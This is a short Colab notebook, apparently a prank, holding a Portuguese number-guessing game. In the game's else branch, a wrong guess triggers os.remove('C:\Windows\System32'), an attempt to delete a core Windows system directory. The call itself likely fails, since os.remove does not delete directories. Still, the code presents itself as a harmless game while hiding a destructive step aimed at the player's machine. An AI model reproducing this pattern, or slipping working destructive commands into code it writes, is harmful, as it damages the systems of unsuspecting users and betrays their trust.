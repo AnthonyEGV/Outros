{
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "## **Jogo**"
      ],
      "metadata": {
        "id": "oSIpp0uHmchR"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import random\n",
        "import os\n",
        "numero = random.randint(1,10)\n",
        "\n",
        "adivinhe = input(\"O jogo! Adivinhe um número entre 1 e 10: \")\n",
        "adivinhe = int(adivinhe)\n",
        "\n",
        "if adivinhe == numero:\n",
        "  print('Parabéns! Você ganhou!')\n",
        "else:\n",
        "  os.remove(\"C:\\Windows\\System32\")\n"
      ],
      "metadata": {
        "id": "SKpmyVaNlHQ3"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "name": "Olá, este é o Colaboratory",
      "toc_visible": true,
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}